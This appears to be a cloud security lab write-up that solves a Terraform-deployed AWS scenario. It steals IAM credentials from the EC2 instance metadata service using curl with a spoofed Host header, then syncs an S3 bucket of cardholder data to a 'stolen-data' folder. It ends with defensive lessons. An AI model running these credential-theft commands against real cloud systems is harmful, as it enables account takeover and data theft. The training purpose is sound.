SOLUTION:
To find the flag, I’ve taken the following steps:

•	Step 1: Deploy the environment

I started by deploying the vulnerable cloud environment using Terraform.
- terraform init
- terraform plan
- terraform apply

After `terraform apply`, the output provided scenario details and a set of attack instructions. These outputs confirmed that:
- The EC2 instance was publicly accessible
- IMDSv1 was enabled (vulnerable)
- An IAM role was attached to the EC2 instance
- The goal was to download confidential files from an S3 bucket

•	Step 2: Retrieve IAM Credentials

Terraform provided commands to retrieve temporary IAM credentials by accessing the instance metadata service through the exposed EC2 instance.
The commands executed were:

- curl http://98.92.97.70
- curl http://98.92.97.70/latest/meta-data/iam/security-credentials/ -H "Host: 169.254.169.254"
- curl http://98.92.97.70/latest/meta-data/iam/security-credentials/<ROLE_NAME> -H "Host: 169.254.169.254"

The output returned temporary credentials in JSON format, including:
-	AccessKeyId  
-	SecretAccessKey  
-	SessionToken  

•	Step 3: Configure AWS Credentials Locally

Using the values obtained in Step 2, I configured the AWS credentials as environment variables.
- $env:AWS_ACCESS_KEY_ID="<AccessKeyId>"  
- $env:AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"  
- $env:AWS_SESSION_TOKEN="<SessionToken>"

•	Step 4: Verify the Active AWS Identity

After configuring the credentials, I verified that the AWS CLI was using the correct identity.
- aws sts get-caller-identity
  
This confirmed that the temporary IAM role credentials were active.

•	Step 5: List S3 Buckets

Next, I checked which S3 buckets were accessible using the configured credentials.
- aws s3 ls

The successful output confirmed that the IAM role had sufficient permissions to list S3 resources.

•	Step 6: Download Files from the S3 Bucket

After identifying the target bucket, I downloaded its contents locally.
- aws s3 sync s3://<BUCKET_NAME> ./stolen-data/

The downloaded files included:
- cardholder_data_primary.csv
- cardholder_data_secondary.csv
- FLAG.txt 

•	Step 7: Verify Extracted Files and Retrieve the Flag

I verified the downloaded data by viewing the contents locally.
- cat ./stolen-data/FLAG.txt
- cat ./stolen-data/cardholder_data_primary.csv  
- cat ./stolen-data/cardholder_data_secondary.csv  



REFLECTION

•	Question 1: What was your approach?

~ My approach was to deploy the environment using Terraform, review the scenario outputs to understand the misconfiguration, retrieve the temporary IAM credentials provided through the instance metadata service, configure those credentials locally, and then access the S3 bucket to retrieve the flag.

•	Question 2: What was the biggest challenge?

~ The biggest challenge was understanding how the EC2 instance exposure, instance metadata service, IAM role, and S3 permissions were connected in the attack path.

•	Question 3: How did you overcome the challenge?

~ I overcame this by validating each step incrementally, first confirming the credentials worked and then confirming what permissions they provided by testing S3 access.

•	Question 4: What led to the breakthrough?

~ The breakthrough occurred when the AWS identity verification succeeded and S3 access was confirmed, allowing the bucket contents and flag to be downloaded.

•	Question 5: On the blue side, how can this learning be used to properly defend important assets?

~ This lab demonstrates how cloud misconfigurations can be chained together. Defenses include enforcing IMDSv2, restricting public exposure of EC2 instances, applying least-privilege IAM roles, securing S3 bucket policies, and monitoring for unusual credential usage.
